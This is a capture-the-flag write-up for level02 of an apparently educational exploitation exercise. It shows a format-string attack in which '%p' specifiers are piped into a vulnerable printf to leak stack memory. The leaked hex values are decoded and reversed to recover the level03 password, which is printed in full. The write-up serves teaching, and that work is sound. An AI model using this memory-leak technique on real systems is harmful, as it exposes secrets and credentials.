# Level02

After looking at the code, we see that the password of level03 is stored in a variable, and there is a vulnerable call to printf if the password check fails. At first we try to simply print the content of the stack to see if there's anything relevant (see [rainfall levels 03-05](https://github.com/SERAC-SGM/rainfall-42)) :

    level02@OverRide:~$ python -c 'print " %p" * 50' | ./level02 
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: --[ Password: *****************************************
    0x7fffffffe4f0 (nil) 0x20 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x702520 (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 does not have access!

Thanks to our newly acquired skill to detect ASCII in hexadecimal format, we can find 5 weird-looking values, and their converted ASCII value :

    0x756e505234376848: unPR47hH
    0x45414a3561733951: EAJ5as9Q
    0x377a7143574e6758: 7zqCWNgX
    0x354a35686e475873: 5J5hnGXs
    0x48336750664b394d: H3gPfK9M

The string formed is (don't forget the stack is from lowest to highest bytes ) :

    H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH

This is **very strangely** similar to a password. Let's try it :

    level02@OverRide:~$ su level03
    Password: H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH
    su: Authentication failure

Of course little-endian architecture is to blame here.

    level02@OverRide:~$ echo "H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH" | rev
    Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
    level02@OverRide:~$ su level03
    Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
    level03@OverRide:~$

noice
